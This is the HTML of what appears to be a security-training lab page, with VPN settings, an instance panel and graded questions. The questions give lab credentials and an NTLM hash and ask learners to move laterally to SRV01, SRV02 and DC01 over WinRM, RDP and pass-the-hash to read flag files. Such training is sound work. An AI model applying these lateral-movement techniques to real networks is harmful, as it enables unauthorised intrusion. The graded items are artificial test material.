<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2471 text-dark"></span> with user "<span class="text-success">Frewdy</span>" and
                                password "<span class="text-danger">Kiosko093</span>" </p>
<label class="module-question" for="2471"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Use WinRM to connect to SRV01 and submit flag located at C:\Users\frewdy\Desktop\flag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2471" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2471">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2471" id="btnAnswer2471">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2472 text-dark"></span> with user "<span class="text-success">helen</span>" and
                                password "<span class="text-danger">RedRiot88</span>" </p>
<label class="module-question" for="2472"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Connect to the target machine using Helen's Credentials, from there, use Leonvqz hash A35289033D176ABAAF6BEAA0AA681400 to connect to SRV02 and read the flag located at C:\Users\Leonvqz\Desktop\flag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2472" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2472">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2472" id="btnAnswer2472">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="2473"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Connect to DC01 as Leonvqz and read the flag located at C:\Users\Leonvqz\Desktop\flag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2473" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2473">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2473" id="btnAnswer2473">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint2473" data-toggle="modal" id="hintBtn2473"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Optional Exercises</h4>
<p class="card-title-desc font-size-large font-size-15">
                                Challenge your understanding of the Module content and answer the optional
                                question(s) below. These are considered supplementary content and are not
                                required to complete the Module. You can reveal the answer at any time to check
                                your work.
                            </p>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
</div>
<div>
<div>
<label class="module-question" for="85">Use PowerShell Web Access on SRV01 with Frewdy's credentials and connect to SRV02 using Helen's credentials. Use DONE as the answer when finished.</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="exerciseAnswer85" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswerExercise" data-exercise-id="85" id="btnAnswerExercise85">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                        </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#revealExerciseAnswer85" data-toggle="modal" id="answerExerciseBtn85"><i class="fad fa-life-ring mr-2"></i> Reveal Answer
                                    </button>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
